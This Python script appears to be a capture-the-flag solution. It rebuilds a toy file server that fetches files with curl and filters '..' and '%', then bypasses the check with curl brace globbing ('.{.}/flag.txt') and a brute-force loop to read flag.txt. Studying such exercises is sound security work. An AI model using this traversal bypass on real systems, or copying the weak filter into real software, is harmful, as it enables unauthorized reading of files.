import subprocess
import os
from urllib.parse import quote


def validate(key: str) -> bool:
    # E.g. key == "{name}" -> True
    #      key == "name"   -> False
    if len(key) == 0:
        return False
    is_valid = True
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
    return is_valid


def template(text: str, params: dict[str, str]) -> str:
    # A very simple template engine
    for key, value in params.items():
        if not validate(key):
            return f"Invalid key: {key}"
        text = text.replace(key, value)
    return text



def index(filename, args: dict[str, str]):
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("

    try:
        x = f"file://{quote(os.getcwd())}/public/{filename}"
        print(x)
        proc = subprocess.run(
            ["curl", x],
            capture_output=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout"
    
    if proc.returncode != 0:
        print(proc.stdout.decode())
        print(proc.stderr.decode())
        return "Something wrong..."
    return template(proc.stdout.decode(), args)

def brute():
    for i in range(0xff):
        try:
            print(index(f".{chr(i)}./flag.txt", {}))
        except:
            pass

# brute()
print(index(".{.}/flag.txt", {}))
